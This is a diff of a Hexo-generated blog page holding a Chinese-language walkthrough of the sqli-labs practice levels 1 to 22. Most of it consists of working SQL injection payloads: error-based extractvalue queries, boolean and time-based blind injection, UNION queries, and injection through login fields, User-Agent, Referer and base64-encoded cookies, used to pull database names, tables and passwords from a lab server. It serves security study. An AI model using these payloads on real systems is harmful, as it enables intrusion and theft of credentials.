@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>Hexo</title>
+    <title>sql-lib - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -406,7 +406,7 @@ header .header__right .dropdown-menus .dropdown-menu {
 <article class="page">
 <div id="post-meta-m">
     <div class="post-meta" id="post-meta">
-  <h3></h3>
+  <h3>sql-lib</h3>
     
       <span class="post-meta-label">
         John Doe
@@ -415,8 +415,8 @@ header .header__right .dropdown-menus .dropdown-menu {
     
       <span class="post-meta-label">
         <span class="p-dot"></span>
-        <time datetime="2022-03-23 17:27" pubdate>
-          2022-03-23
+        <time datetime="2022-04-06 14:40" pubdate>
+          2022-04-06
         </time>
       </span>
     
@@ -445,7 +445,7 @@ header .header__right .dropdown-menus .dropdown-menu {
 <p>报错注入<br>● 该函数对xml文档进行查询。<br>● extractvalue(xml_frag,xpath_expr) 第一个参数式是查询内容，第二个参数是查询路径。<br>● 原理：当路径写入格式错误就会报错，显示出来，同时还会写入我们的非法查询语句并将查询的结果返回出来，所以在第二个参数位置构造sql语句进行注入<br>● and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。<br>payload即我们要输入的sql查询语句<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> and (select extractvalue(1,concat(0x7e,(select user())))) –+  //更换select后的语句进行查询 （版本version()  数据库database()）<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) –+  //列如这样 里面语句和上面union一样</p>
 <p>第五关<br>id=1’ 发现报错 id=1’ –+ 不报错但是回显的内容和初始内容一样，说明这个为可以用布尔盲注，时间盲注，报错注入<br>布尔盲注：<br>?id=1’ and substr((select database()),n,1)=’s’–+     通过这个语句判断出数据库的名字，不断改变n的值来，看是否有回显，正确有回显，错误没有回显   判断’s’可以用burp工具来进行  最终确定的库名为security。<br>?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit x,1),n,1)=’s’–+   修改limit x,1和中x 可以选择第几个表, substr中的n用来判断表名每个位置的字母，爆破到第一张表为referer，终于在第三张表爆破到users表。<br>?id=1’ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),n,1)=’u’–+ 同理找到第一个字段为username第2个字段为password<br>?id=1’ and substr((select username from users limit 0,1),n,1)=’d’–+ 同理找到其中数据<br>?id=1’ and substr((select password from users limit 0,1),n,1)=’d’–+</p>
 <p>时间盲注：<br>?id=1’ and if((substr((select database()),n,1)=’s’),sleep(10),1) –+  和布尔同理通过改变n 来确定数据库名， 正确会延迟，错误没有延迟<br>举一反三 把里面的内容替换，如上面布尔盲注，就可找到数据</p>
-<p>第六关（双引号字符型注入，方法与第五关相同）<br>第七关 （8会）<br>第八关   id=1回显，加个单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了，证明没跑了。<br>第九关    不管怎么输入，回显总是you are .  ..<br>?id=1’ and sleep(5)–+  发现明显延迟，说明注入成功，接下来爆破就完了<br>第十关 基于双引号的时间盲注<br>只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。<br>第十一关 是一个登陆页面，通常post传送不能在url上看到数据，只能通过抓包工具进行查看<br>输入admin admin 登陆，抓包，发送到repeater模块 在repeater中通过修改post的参数进行注入<br>admin’ and 1=1# 可以登录<br>admin’ and 1=2# 不可以登录<br> 说明注入生效，存在报错型注入，接下来又是重复性工作，上extractvalue()<br>admin’ and extractvalue(1,concat(0x7e,(select datbase())))#<br>也可以使用union<br>admin’ order by 2#<br>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #<br>第十二关<br>admin”) 进行注入<br>第十三关发现登陆成功没有回显，所以可以用报错注入，时间盲注<br>admin’) and extractvalue(1,concat(0x7e,(select database())))#<br>admin’) and if((substr((select database()),1,1)=’s’),sleep(5),1)#<br>第十四关 基于” 的注入（报错注入，时间盲注）<br>同上一关<br>第十五关 登录后没有回显  admin’ #登录成功 说明是基余’的注入<br>用报错注入发现显示不了数据，时间延迟注入可以！<br>第十六关 和上一关相同 admin”)#基余”)的注入<br>第十七关 实在密码部分的注入<br>前面用户名填admin 后面密码：admin’ and extractvalue(1,concat(0x7e,(select version())))#<br>第十八关   我们直接在user_agent中进行测试，加入单引号后出现报错信息，根据报错信息  猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘User-Agent’,’Ip’,’Username’)  三个参数<br>通过报错注入：’,extractvalue(1,concat(0x7e,(select user()),0x7e)) ,1)#<br>第十九关 我们抓取数据包，在referter上来做文章，先输入个单引号看下错误信息<br>猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘Referter’,’Ip’,)<br>那我们就构造sql语句来满足insert函数<br>这时的sql语句为INSEERT INTO table VALUES(‘1’,1)#’,’Ip’,) 两个参数采用报错注入<br>‘,extractvalue(1,concat(0x7e,(select database()))))#<br>第二十关 cookie注入<br>‘ and extractvalue(1,concat(0x7e,(select database())))#<br>第二十一关 也是cookie 但是cookie通过base64加密了<br>‘ )and extractvalue(1,concat(0x7e,(select database())))#加密一下就好<br>第二十二关 同上一关相同 闭合方式为’</p>
+<p>第六关（双引号字符型注入，方法与第五关相同）<br>第七关 （8会）布尔盲注可以做<br>第八关   id=1回显，加个单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了，证明没跑了。<br>第九关    不管怎么输入，回显总是you are .  ..<br>?id=1’ and sleep(5)–+  发现明显延迟，说明注入成功，接下来爆破就完了<br>第十关 基于双引号的时间盲注<br>只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。<br>第十一关 是一个登陆页面，通常post传送不能在url上看到数据，只能通过抓包工具进行查看<br>输入admin admin 登陆，抓包，发送到repeater模块 在repeater中通过修改post的参数进行注入<br>admin’ and 1=1# 可以登录<br>admin’ and 1=2# 不可以登录<br> 说明注入生效，存在报错型注入，接下来又是重复性工作，上extractvalue()<br>admin’ and extractvalue(1,concat(0x7e,(select datbase())))#<br>也可以使用union<br>admin’ order by 2#<br>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #<br>第十二关<br>admin”) 进行注入<br>第十三关发现登陆成功没有回显，所以可以用报错注入，时间盲注<br>admin’) and extractvalue(1,concat(0x7e,(select database())))#<br>admin’) and if((substr((select database()),1,1)=’s’),sleep(5),1)#<br>第十四关 基于” 的注入（报错注入，时间盲注）<br>同上一关<br>第十五关 登录后没有回显  admin’ #登录成功 说明是基余’的注入<br>用报错注入发现显示不了数据，时间延迟注入可以！<br>第十六关 和上一关相同 admin”)#基余”)的注入<br>第十七关 实在密码部分的注入<br>前面用户名填admin 后面密码：admin’ and extractvalue(1,concat(0x7e,(select version())))#<br>第十八关   我们直接在user_agent中进行测试，加入单引号后出现报错信息，根据报错信息  猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘User-Agent’,’Ip’,’Username’)  三个参数<br>通过报错注入：’,extractvalue(1,concat(0x7e,(select user()),0x7e)) ,1)#<br>第十九关 我们抓取数据包，在referter上来做文章，先输入个单引号看下错误信息<br>猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘Referter’,’Ip’,)<br>那我们就构造sql语句来满足insert函数<br>这时的sql语句为INSEERT INTO table VALUES(‘1’,1)#’,’Ip’,) 两个参数采用报错注入<br>‘,extractvalue(1,concat(0x7e,(select database()))))#<br>第二十关 cookie注入<br>‘ and extractvalue(1,concat(0x7e,(select database())))#<br>第二十一关 也是cookie 但是cookie通过base64加密了<br>‘ )and extractvalue(1,concat(0x7e,(select database())))#加密一下就好<br>第二十二关 同上一关相同 闭合方式为’</p>
 
       </div>
     </div>
